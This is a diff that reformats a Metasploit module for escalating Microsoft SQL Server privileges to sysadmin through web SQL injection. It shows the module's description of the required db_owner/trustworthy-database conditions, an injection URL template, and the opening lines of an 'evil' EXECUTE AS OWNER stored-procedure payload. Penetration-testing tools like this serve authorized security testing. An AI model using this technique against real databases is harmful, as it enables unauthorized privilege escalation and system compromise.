@@ -3,26 +3,28 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MSSQL_SQLI
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft SQL Server SQLi Escalate Db_Owner',
-      'Description'    => %q{
-        This module can be used to escalate SQL Server user privileges to sysadmin through a web
-        SQL Injection. In order to escalate, the database user must to have the db_owner role in
-        a trustworthy database owned by a sysadmin user. Once the database user has the sysadmin
-        role, the mssql_payload_sqli module can be used to obtain a shell on the system.
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft SQL Server SQLi Escalate Db_Owner',
+        'Description' => %q{
+          This module can be used to escalate SQL Server user privileges to sysadmin through a web
+          SQL Injection. In order to escalate, the database user must to have the db_owner role in
+          a trustworthy database owned by a sysadmin user. Once the database user has the sysadmin
+          role, the mssql_payload_sqli module can be used to obtain a shell on the system.
 
-        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
-      },
-      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
-      'License'        => MSF_LICENSE,
-      'References'     => [['URL','http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]
-    ))
+          The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
+        },
+        'Author' => [ 'nullbind <scott.sutherland[at]netspi.com>'],
+        'License' => MSF_LICENSE,
+        'References' => [['URL', 'http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]
+      )
+    )
   end
 
   def run
@@ -185,7 +187,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # Attempt to escalate privileges
-  def escalate_privs(dbowner_db,db_user)
+  def escalate_privs(dbowner_db, db_user)
     # Create the evil stored procedure WITH EXECUTE AS OWNER
     evil_sql_create = "1;use #{dbowner_db};
       DECLARE @myevil as varchar(max)
